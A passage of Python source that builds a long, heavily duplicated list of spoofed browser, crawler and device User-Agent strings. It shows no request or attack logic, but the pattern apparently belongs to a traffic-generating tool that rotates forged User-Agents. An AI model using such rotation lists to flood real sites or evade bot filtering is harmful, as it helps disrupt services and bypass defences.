                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
